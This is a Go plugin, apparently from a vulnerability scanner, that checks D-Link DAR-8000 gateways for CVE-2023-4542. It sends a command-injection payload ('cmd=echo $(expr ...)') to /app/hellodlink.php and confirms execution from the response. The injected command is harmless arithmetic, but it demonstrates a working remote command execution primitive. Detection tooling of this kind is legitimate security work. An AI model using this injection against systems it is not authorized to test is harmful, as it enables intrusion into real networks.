package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"strings"
	"time"
)

func init() {
	Register("dlink_dar8000_cve_2023_4542", &dlink_dar8000_cve_2023_4542{})
}

type dlink_dar8000_cve_2023_4542 struct{}

func (p *dlink_dar8000_cve_2023_4542) Info() PluginInfo {
	return PluginInfo{
		Name:     "D-Link DAR-8000 远程命令执行漏洞",
		VulnInfo: "D-Link DAR上网行为审计网关可以为企业提供完善的互联网访问行为管理解决方案，全面保护企业的运营效率和信息安全。DAR系列产品提供全面的应用识别和控制能力、精细化的应用层带宽管理能力、分类化的海量URL过滤能力、详尽的上网行为审计能力以及丰富的上网行为报表，从而帮助企业快速构建可视化、低成本以及高效安全的商业网络。D-Link上网行为管理系统存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限。",
		VulnID:   "CVE-2023-4542",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "version <= 20230809",
		CWE:      "CWE-78	OS命令注入",
	}
}

func (p *dlink_dar8000_cve_2023_4542) Check(netloc string) bool {
	// 这个服务只支持低版本的tls协议，于是单独开一个http
	transport := &http.Transport{
		MaxIdleConns:    10,
		IdleConnTimeout: 5 * time.Second,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS10,
		},
	}
	var client = &http.Client{
		Timeout:   time.Second * 2,
		Transport: transport,
	}

	rand1 := utils.GenRandomInt(5)
	rand2 := utils.GenRandomInt(5)

	payload := fmt.Sprintf("cmd=echo%%20%%24%%28expr%%20%d%%20%%2B%%20%d%%29", rand1, rand2)
	req, err := http.NewRequest("POST", netloc+"/app/hellodlink.php", bytes.NewBufferString(payload))
	if err != nil {
		return false
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	body, _ := io.ReadAll(resp.Body)
	defer resp.Body.Close()

	if resp.StatusCode == 200 && strings.Contains(string(body), strconv.Itoa(rand1+rand2)) {
		return true
	}
	return false
}
